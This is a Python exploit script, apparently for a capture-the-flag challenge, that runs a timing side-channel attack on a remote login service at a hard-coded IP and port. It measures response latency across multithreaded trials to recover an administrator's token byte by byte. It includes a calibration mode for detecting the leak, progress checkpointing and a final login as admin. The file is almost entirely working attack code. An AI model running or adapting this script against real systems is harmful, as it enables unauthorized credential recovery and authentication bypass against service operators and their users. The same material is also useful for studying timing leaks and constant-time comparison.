import argparse
import json
import os
import socket
import statistics
import sys
import time
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from typing import Optional, Tuple


def _acquire_save_lock(lock_path: str):
    """Acquire an exclusive (best-effort) inter-process lock.

    This prevents multiple concurrent runs from writing the same progress file.
    Returns an open file handle that must be kept alive for the lock to stay held.
    """

    os.makedirs(os.path.dirname(os.path.abspath(lock_path)) or ".", exist_ok=True)
    f = open(lock_path, "a+", encoding="utf-8")
    try:
        if os.name == "nt":
            import msvcrt

            try:
                # Lock 1 byte, non-blocking.
                msvcrt.locking(f.fileno(), msvcrt.LK_NBLCK, 1)
            except OSError:
                raise RuntimeError(
                    f"Could not acquire lock {lock_path!r}. Another timing_attack.py is likely running with the same --save path."
                )
        else:
            import fcntl

            try:
                fcntl.flock(f.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            except OSError:
                raise RuntimeError(
                    f"Could not acquire lock {lock_path!r}. Another timing_attack.py is likely running with the same --save path."
                )
        return f
    except Exception:
        try:
            f.close()
        except Exception:
            pass
        raise


def _atomic_write_json(path: str, data: dict) -> None:
    tmp = f"{path}.tmp.{os.getpid()}"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)


@dataclass
class Resp:
    raw_line: str
    dt_ns: int


class SockReader:
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.buf = bytearray()

    def recv_until(self, marker: bytes, limit: int = 1 << 20) -> bytes:
        while True:
            idx = self.buf.find(marker)
            if idx != -1:
                end = idx + len(marker)
                out = bytes(self.buf[:end])
                del self.buf[:end]
                return out

            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("connection closed")
            self.buf += chunk
            if len(self.buf) > limit:
                raise RuntimeError("recv_until overflow")


class HearthSession:
    def __init__(self, host: str, port: int, timeout: float = 10.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.r = SockReader(self.s)

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

    def _menu(self):
        self.r.recv_until(b"> ")

    def register(self, username: str) -> bytes:
        self._menu()
        self.s.sendall(b"1\n")
        self.r.recv_until(b"Enter username: ")
        self.s.sendall(username.encode() + b"\n")
        # JSON line
        line = self.r.recv_until(b"\n")
        obj = json.loads(line.decode().strip())
        return bytes.fromhex(obj["token"])

    def login(self, uid: int, username: str, token: bytes) -> Resp:
        self._menu()
        self.s.sendall(b"2\n")
        self.r.recv_until(b"Enter UID: ")
        self.s.sendall(f"{uid}\n".encode())
        self.r.recv_until(b"Enter username: ")
        self.s.sendall(username.encode() + b"\n")
        self.r.recv_until(b"Enter token (hex): ")
        t0 = time.perf_counter_ns()
        self.s.sendall(token.hex().encode() + b"\n")
        line = self.r.recv_until(b"\n")
        t1 = time.perf_counter_ns()
        return Resp(raw_line=line.decode(errors="replace").strip(), dt_ns=t1 - t0)


def safe_session(host: str, port: int, timeout: float = 10.0) -> HearthSession:
    return HearthSession(host, port, timeout=timeout)


def measure_once(sess: HearthSession, uid: int, username: str, token: bytes) -> int:
    # return timing in ns
    return sess.login(uid, username, token).dt_ns


def robust_stat(samples_ns):
    # median is robust to occasional spikes
    return statistics.median(samples_ns)


def score_candidate(
    sess: HearthSession,
    uid: int,
    username: str,
    token: bytes,
    trials: int,
    *,
    host: str,
    port: int,
) -> Tuple[int, HearthSession]:
    """Return (score_ns, possibly_reconnected_session)."""
    times = []
    for _ in range(trials):
        try:
            times.append(measure_once(sess, uid, username, token))
        except (TimeoutError, EOFError, OSError):
            # reconnect and retry this trial
            sess.close()
            sess = safe_session(host, port)
            times.append(measure_once(sess, uid, username, token))
    return int(robust_stat(times)), sess


def recover_token_timing(
    host: str,
    port: int,
    uid: int,
    username: str,
    token_len: int,
    workers: int = 16,
    coarse_trials: int = 1,
    refine_trials: int = 5,
    topk: int = 6,
    resume_prefix_hex: Optional[str] = None,
    save_path: Optional[str] = None,
    max_bytes: Optional[int] = None,
) -> bytes:
    if resume_prefix_hex:
        prefix = bytearray(bytes.fromhex(resume_prefix_hex))
    else:
        prefix = bytearray()

    if len(prefix) > token_len:
        raise ValueError("resume prefix longer than token length")

    filler = bytes([0]) * (token_len - len(prefix))
    cur = bytes(prefix) + filler

    # Create one persistent session per worker.
    sessions = [safe_session(host, port) for _ in range(workers)]
    locks = [Lock() for _ in range(workers)]
    try:
        end_at = token_len if max_bytes is None else min(token_len, max_bytes)
        for i in range(len(prefix), end_at):
            # coarse scan all 256 candidates
            def task(worker_idx: int, cand: int, trials: int):
                tok = bytearray(cur)
                tok[i] = cand
                # keep bytes after i fixed (filler) to avoid accidental deep matches
                with locks[worker_idx]:
                    score, new_sess = score_candidate(
                        sessions[worker_idx],
                        uid,
                        username,
                        bytes(tok),
                        trials,
                        host=host,
                        port=port,
                    )
                    sessions[worker_idx] = new_sess
                return cand, score

            futures = []
            with ThreadPoolExecutor(max_workers=workers) as ex:
                for cand in range(256):
                    worker_idx = cand % workers
                    futures.append(ex.submit(task, worker_idx, cand, coarse_trials))

                scored = []
                for fut in as_completed(futures):
                    scored.append(fut.result())

            scored.sort(key=lambda t: t[1], reverse=True)
            shortlist = [c for c, _ in scored[:topk]]

            # refine the top candidates with more trials
            ref_scored = []
            with ThreadPoolExecutor(max_workers=workers) as ex:
                ref_futs = []
                for j, cand in enumerate(shortlist):
                    worker_idx = j % workers
                    ref_futs.append(ex.submit(task, worker_idx, cand, refine_trials))
                for fut in as_completed(ref_futs):
                    ref_scored.append(fut.result())

            ref_scored.sort(key=lambda t: t[1], reverse=True)
            best_cand, best_score = ref_scored[0]
            prefix.append(best_cand)
            cur = bytes(prefix) + bytes([0]) * (token_len - len(prefix))

            print(
                f"[+] byte {i+1}/{token_len}: 0x{best_cand:02x}  (score={best_score/1e6:.3f} ms)  prefix={bytes(prefix).hex()}",
                flush=True,
            )

            if save_path:
                _atomic_write_json(
                    save_path,
                    {
                        "uid": uid,
                        "username": username,
                        "token_len": token_len,
                        "prefix_hex": bytes(prefix).hex(),
                    },
                )

        return bytes(prefix)
    finally:
        for s in sessions:
            s.close()


def flip_at(token: bytes, pos: int) -> bytes:
    b = bytearray(token)
    b[pos] ^= 1
    return bytes(b)


def calibrate(host: str, port: int, username: str = "nhat", trials: int = 40) -> None:
    """Quick test: does the remote leak timing based on mismatch position in bytes equality?"""
    sess = HearthSession(host, port)
    try:
        tok = sess.register(username)
        uid = 1  # first registration in a fresh connection is uid=1

        # build wrong tokens that differ at different positions
        wrong_early = flip_at(tok, 0)
        wrong_late = flip_at(tok, len(tok) - 1)

        # warm-up
        sess.login(uid, username, wrong_early)
        sess.login(uid, username, wrong_late)

        early = []
        late = []
        for _ in range(trials):
            early.append(sess.login(uid, username, wrong_early).dt_ns)
            late.append(sess.login(uid, username, wrong_late).dt_ns)

        def stats(x):
            return {
                "mean_ms": statistics.mean(x) / 1e6,
                "stdev_ms": statistics.pstdev(x) / 1e6,
                "min_ms": min(x) / 1e6,
                "max_ms": max(x) / 1e6,
            }

        print("[+] Calibration results (wrong token differs at pos 0 vs last byte)")
        print("    early:", stats(early))
        print("    late :", stats(late))
        print("    delta_mean_ms:", (statistics.mean(late) - statistics.mean(early)) / 1e6)
        print("[!] If delta_mean_ms is consistently > ~0.2ms with low noise, timing attack may be feasible.")
    finally:
        sess.close()


def main():
    ap = argparse.ArgumentParser(description="Timing attack helpers for crypto_disguised")
    ap.add_argument("--host", default="154.57.164.69")
    ap.add_argument("--port", type=int, default=31239)
    ap.add_argument("--calibrate", action="store_true")
    ap.add_argument("--username", default="nhat")
    ap.add_argument("--trials", type=int, default=50)
    ap.add_argument("--attack-admin", action="store_true", help="Recover admin token via timing")
    ap.add_argument("--workers", type=int, default=16)
    ap.add_argument("--coarse-trials", type=int, default=1)
    ap.add_argument("--refine-trials", type=int, default=6)
    ap.add_argument("--topk", type=int, default=6)
    ap.add_argument("--resume", default=None, help="resume prefix hex")
    ap.add_argument("--save", default="timing_progress.json", help="save progress json")
    ap.add_argument("--token-len", type=int, default=160)
    ap.add_argument("--max-bytes", type=int, default=0, help="for testing: recover only first N bytes (0 = full)")
    args = ap.parse_args()

    if args.calibrate:
        calibrate(args.host, args.port, username=args.username, trials=args.trials)
        return

    if args.attack_admin:
        uid = 0
        user = "TinselwickAdmin"
        token_len = args.token_len
        max_bytes = args.max_bytes if args.max_bytes and args.max_bytes > 0 else None

        # Prevent concurrent runs from corrupting the progress file.
        lock_fh = None
        if args.save:
            try:
                lock_fh = _acquire_save_lock(args.save + ".lock")
            except Exception as e:
                print(f"[!] {e}", file=sys.stderr)
                sys.exit(2)

        print(
            f"[+] Starting timing recovery for uid={uid}, username={user}, token_len={token_len} bytes",
            flush=True,
        )
        try:
            tok = recover_token_timing(
                args.host,
                args.port,
                uid,
                user,
                token_len,
                workers=args.workers,
                coarse_trials=args.coarse_trials,
                refine_trials=args.refine_trials,
                topk=args.topk,
                resume_prefix_hex=args.resume,
                save_path=args.save,
                max_bytes=max_bytes,
            )
            print(f"[+] Recovered token hex: {tok.hex()}")
        finally:
            if lock_fh is not None:
                try:
                    lock_fh.close()
                except Exception:
                    pass

        # Verify
        sess = HearthSession(args.host, args.port)
        try:
            resp = sess.login(uid, user, tok)
            print("[+] Server response:")
            print(resp.raw_line)
        finally:
            sess.close()
        return

    print("Use --calibrate to estimate leakage, or --attack-admin to run the full timing attack.")


if __name__ == "__main__":
    main()
